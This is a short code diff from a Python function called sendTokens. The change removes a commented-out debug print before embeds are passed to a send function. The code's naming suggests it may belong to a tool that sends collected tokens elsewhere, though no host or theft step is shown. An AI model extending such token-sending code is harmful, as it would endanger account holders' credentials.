@@ -153,7 +153,6 @@ def sendTokens(tokens):
                 ),
             ]
         ))
-    # print(embeds)
     s = send_data.sendData(embeds)
     if s:
         print('success')
